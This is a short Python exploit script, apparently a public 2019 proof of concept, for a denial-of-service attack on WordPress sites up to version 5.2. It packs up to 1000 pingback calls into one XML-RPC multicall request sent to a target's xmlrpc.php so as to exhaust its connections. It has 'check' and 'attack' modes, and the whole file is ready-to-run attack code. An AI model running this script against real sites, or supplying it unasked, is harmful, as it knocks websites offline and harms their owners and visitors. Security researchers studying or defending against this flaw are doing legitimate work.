#!/usr/bin/env python
# Wordpress <=5.2.? DoS
# Abusing pingbacks+xmlrpc multicall to exhaust connections
# @roddux 2019
# TODO:
# - Verify root cause
# - Optimise number of entries per request, check class-wp-xmlrpc-server.php
# - Implement threading

from urllib.parse import urlparse
import sys, uuid, urllib3, requests
urllib3.disable_warnings()

DEBUG = False 
def dprint(X):
	if DEBUG: print(X)

def build_entry(pingback,target):
	entry  = "<value><struct><member><name>methodName</name><value>pingback.ping</value></member><member>"
	entry += f"<name>params</name><value><array><data><value>{pingback}/{uuid.uuid4()}</value>"
	entry += f"<value>{target}/?p=1</value></data></array></value></member></struct></value>"
	return entry

def build_request(pingback,target,entries):
	prefix   = "<methodCall><methodName>system.multicall</methodName><params><param><array>"
	suffix   = "</array></param></params></methodCall>"
	request  = prefix
	for _ in range(0,entries): request += build_entry(pingback,target)
	request += suffix
	return request

def usage_die():
	print(f"[!] Usage: {sys.argv[0]} <check/attack> <pingback url> <target url>")
	exit(1)
	
def get_args():
	if len(sys.argv) != 4: usage_die()
	action   = sys.argv[1]
	pingback = sys.argv[2]
	target   = sys.argv[3]
	if action not in ("check","attack"): usage_die()
	for URL in (pingback,target):
		res = urlparse(URL)
		if not all((res.scheme,res.netloc)): usage_die()
	return (action,pingback,target)

def main(action,pingback,target):
	# he chec
	if action == "check":    entries = 2
	# he attac
	elif action == "attack": entries = 1000
	# but most importantly
	print(f"[+] Running in {action} mode")
	# he pingbac
	print(f"[+] Got pingback URL \"{pingback}\"")
	print(f"[+] Got target URL \"{target}\"")
	print(f"[+] Building {entries} pingback calls")
	xmldata = build_request(pingback,target,entries)
	dprint("[+] Request:\n")
	dprint(xmldata+"\n")
	print(f"[+] Request size: {len(xmldata)}b")
	print("[+] Sending request")
	resp = requests.post(f"{target}/xmlrpc.php", xmldata, verify=False, allow_redirects=False)
	print("[+] Request sent")
	if resp.status_code != 200:
		print(f"[!] Received odd status ({resp.status_code}) -- check target url")
		exit(1)
	else:
		dprint("[+] Response snippet:\n")
		dprint(resp.content.decode("UTF-8")[0:500]+"\n")
		print("[+] Done")

if __name__ == "__main__":
	main(*get_args())
